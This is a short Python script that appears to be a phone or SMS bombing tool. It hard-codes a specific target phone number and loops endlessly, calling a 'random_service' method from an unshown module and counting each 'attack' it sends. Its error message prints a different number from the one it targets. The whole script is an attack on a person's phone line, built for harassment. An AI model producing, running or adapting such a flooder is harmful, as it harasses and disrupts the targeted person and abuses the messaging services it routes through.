import sys, os
import argparse
from StructService import Distribution_Service
from config import attack

attack_number_phone=Distribution_Service()
try:
    attack_number_phone.phone('+905346381542')
except Exception as error:
    print(f'Phone - +905555555555')
    sys.exit()

while True:
    try:
        attack_number_phone.random_service()
        attack += 1
        print(f"Sending: {attack}")
    except Exception:
        pass

#
